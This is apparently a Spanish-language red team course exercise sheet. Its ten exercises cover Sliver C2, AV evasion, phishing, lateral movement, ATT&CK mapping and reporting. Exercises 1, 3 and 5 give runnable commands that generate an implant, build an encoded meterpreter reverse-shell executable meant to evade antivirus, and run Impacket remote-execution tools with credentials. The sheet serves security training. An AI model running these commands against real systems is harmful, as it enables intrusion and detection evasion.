# Red Team - Fase 6: Red Team Avanzado Ejercicios

## Ejercicio 1: Sliver Setup

### Objetivo
Instalar y usar Sliver.

### Pasos
```bash
# Download
wget https://github.com/BishopFox/sliver/releases/download/v1.5.38/sliver-server_linux

# Run
chmod +x sliver-server_linux
./sliver-server_linux

# Generate implant
generate --mtls 192.168.1.10 --os windows -f shell
```

### Entregable
Implant generado.

---

## Ejercicio 2: C2 Infrastructure

### Objetivo
Configurar infraestructura de C2.

### Pasos
1. VPS con firewall
2. Domain configurado
3. SSL certificates
4. Redirectores
5. Documentar arquitectura

### Entregable
Infraestructura documentada.

---

## Ejercicio 3: AV Evasion

### Objetivo
Bypassear AV.

### Pasos
```bash
# msfvenom encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=443 -e x86/shikata_ga_nai -c 5 -f exe -o shell.exe

# Veil
veil
use evasion
list
generate
```

### Entregable
Binario indetectable.

---

## Ejercicio 4: Phishing Campaign

### Objetivo
Crear campaña de phishing.

### Pasos
1. Gather intelligence
2. Clone site
3. Create payload
4. Send phishing email
5. Document results

### Entregable
Campaña documentada.

---

## Ejercicio 5: Lateral Movement

### Objetivo
Moverse lateralmente.

### Pasos
```bash
# WMI
python3 wmiexec.py user:pass@target

# PSExec
python3 psexec.py user:pass@target

# Impacket
smbexec.py user:pass@target
```

### Entregable
Shell en segundo sistema.

---

## Ejercicio 6: MITRE ATT&CK

### Objetivo
Mapear técnica a ATT&CK.

### Pasos
1. Seleccionar técnicas
2. Documentar con战术
3. Crear ATT&CK navigator
4. Presentar

### Entregable
Mapa ATT&CK.

---

## Ejercicio 7: OPSEC Review

### Objetivo
Revisar OPSEC.

### Pasos
1. Revisar logs generados
2. Analizar network traffic
3. Check artifacts
4. Recommend improvements

### Entregable
Informe OPSEC.

---

## Ejercicio 8: Full Red Team Engagement

### Objetivo
Simulación completa.

### Pasos
1. Reconnaissance
2. Initial access
3. Escalation
4. Persistence
5. Collection
6. Exfiltration

### Entregable
Engagement completo.

---

## Ejercicio 9: Reporting

### Objetivo
Crear informe profesional.

### Pasos
1. Executive summary
2. Technical details
3. Impact assessment
4. Recommendations
5. Appendices

### Entregable
Informe PDF.

---

## Ejercicio 10: Lessons Learned

### Objetivo
Documentar lecciones.

### Pasos
1. What worked
2. What failed
3. Detection vectors
4. Future improvements

### Entregable
Documento de lecciones.